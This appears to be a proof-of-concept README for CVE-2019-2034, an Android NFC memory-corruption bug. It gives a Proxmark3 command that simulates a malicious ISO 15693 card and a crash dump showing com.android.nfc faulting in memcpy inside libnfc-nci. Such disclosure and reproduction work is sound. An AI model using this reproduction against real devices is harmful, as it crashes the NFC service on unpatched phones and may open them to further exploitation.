# CVE-2019-2034

> Note this PoC contains code from Proxmark3, please comply to its license.

A PoC for vulnerability related to NFC. Just replace the same file of Proxmark3(<https://github.com/Proxmark/proxmark3>) in armsrc folder, and run Proxmark3 to simulate an ISO 15693 card with this command:

`hf 15 sim E016240000000000`

Part of crash dump:

```
12-25 10:11:48.368  1922  2048 F libc    : Fatal signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x7b82800000 in tid 2048 (Thread-5), pid 1922 (com.android.nfc)
12-25 10:11:48.471  3662  3662 I crash_dump64: obtaining output fd from tombstoned, type: kDebuggerdTombstone
12-25 10:11:48.472   920   920 I /system/bin/tombstoned: received crash request for pid 2048
12-25 10:11:48.477  3662  3662 I crash_dump64: performing dump of process 1922 (target tid = 2048)
12-25 10:11:48.494  3662  3662 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
12-25 10:11:48.494  3662  3662 F DEBUG   : Build fingerprint: 'Android/aosp_walleye/walleye:9/PQ1A.181205.006/hyrathon12101154:userdebug/test-keys'
12-25 10:11:48.494  3662  3662 F DEBUG   : Revision: 'MP1'
12-25 10:11:48.494  3662  3662 F DEBUG   : ABI: 'arm64'
12-25 10:11:48.495  3662  3662 F DEBUG   : pid: 1922, tid: 2048, name: Thread-5  >>> com.android.nfc <<<
12-25 10:11:48.495  3662  3662 F DEBUG   : signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x7b82800000
12-25 10:11:48.495  3662  3662 F DEBUG   :     x0  0000007b827f72e8  x1  0000007b72c581ce  x2  0000000000007277  x3  0000007b827fffe0
12-25 10:11:48.495  3662  3662 F DEBUG   :     x4  0000007b72c5f495  x5  0000007b828072e7  x6  0000000000000000  x7  0000000000000000
12-25 10:11:48.495  3662  3662 F DEBUG   :     x8  0000000000000000  x9  0000000000000000  x10 0000000000000000  x11 0000000000000000
12-25 10:11:48.495  3662  3662 F DEBUG   :     x12 0000000000000000  x13 0000000000000000  x14 ffffffffffffffff  x15 0000000000000018
12-25 10:11:48.495  3662  3662 F DEBUG   :     x16 0000007b72c42240  x17 0000007c0d548bc0  x18 000000000000b8ba  x19 0000007b725a9c28
12-25 10:11:48.495  3662  3662 F DEBUG   :     x20 0000007b725a9770  x21 0000007b725aa3a0  x22 0000007b725ac1a0  x23 0000000000000000
12-25 10:11:48.495  3662  3662 F DEBUG   :     x24 0000007b725ac570  x25 0000007b724af000  x26 0000007b726aa588  x27 0000007b72bff894
12-25 10:11:48.495  3662  3662 F DEBUG   :     x28 0000000000000000  x29 0000007b725a96d0
12-25 10:11:48.495  3662  3662 F DEBUG   :     sp  0000007b725a96a0  lr  0000007b72b7a488  pc  0000007c0d51ec88
12-25 10:11:48.505  3662  3662 F DEBUG   : 
12-25 10:11:48.505  3662  3662 F DEBUG   : backtrace:
12-25 10:11:48.505  3662  3662 F DEBUG   :     #00 pc 000000000001dc88  /system/lib64/libc.so (memcpy+280)
12-25 10:11:48.505  3662  3662 F DEBUG   :     #01 pc 0000000000076484  /system/lib64/libnfc-nci.so (nfa_rw_store_ndef_rx_buf(tRW_DATA*) [clone .cfi]+124)
12-25 10:11:48.505  3662  3662 F DEBUG   :     #02 pc 0000000000075bf4  /system/lib64/libnfc-nci.so (nfa_rw_handle_i93_evt(unsigned char, tRW_DATA*) [clone .cfi]+116)
12-25 10:11:48.505  3662  3662 F DEBUG   :     #03 pc 000000000007304c  /system/lib64/libnfc-nci.so (nfa_rw_cback(unsigned char, tRW_DATA*) [clone .cfi]+372)
12-25 10:11:48.505  3662  3662 F DEBUG   :     #04 pc 00000000000b4594  /system/lib64/libnfc-nci.so (rw_i93_sm_read_ndef(NFC_HDR*) [clone .cfi]+1340)
12-25 10:11:48.505  3662  3662 F DEBUG   :     #05 pc 00000000000b709c  /system/lib64/libnfc-nci.so (rw_i93_data_cback(unsigned char, unsigned short, tNFC_CONN*) [clone .cfi]+1444)
12-25 10:11:48.505  3662  3662 F DEBUG   :     #06 pc 00000000000a0748  /system/lib64/libnfc-nci.so (nfc_data_event(tNFC_CONN_CB*) [clone .cfi]+856)
12-25 10:11:48.505  3662  3662 F DEBUG   :     #07 pc 00000000000a03b0  /system/lib64/libnfc-nci.so (nfc_ncif_proc_data(NFC_HDR*) [clone .cfi]+1616)
12-25 10:11:48.505  3662  3662 F DEBUG   :     #08 pc 000000000009f4c8  /system/lib64/libnfc-nci.so (nfc_ncif_process_event(NFC_HDR*) [clone .cfi]+472)
12-25 10:11:48.505  3662  3662 F DEBUG   :     #09 pc 00000000000a4b30  /system/lib64/libnfc-nci.so (nfc_task(unsigned int) [clone .cfi]+608)
12-25 10:11:48.505  3662  3662 F DEBUG   :     #10 pc 00000000000f4f90  /system/lib64/libnfc-nci.so (gki_task_entry(void*) [clone .cfi]+424)
12-25 10:11:48.505  3662  3662 F DEBUG   :     #11 pc 0000000000083194  /system/lib64/libc.so (__pthread_start(void*)+36)
12-25 10:11:48.505  3662  3662 F DEBUG   :     #12 pc 00000000000233bc  /system/lib64/libc.so (__start_thread+68)
```

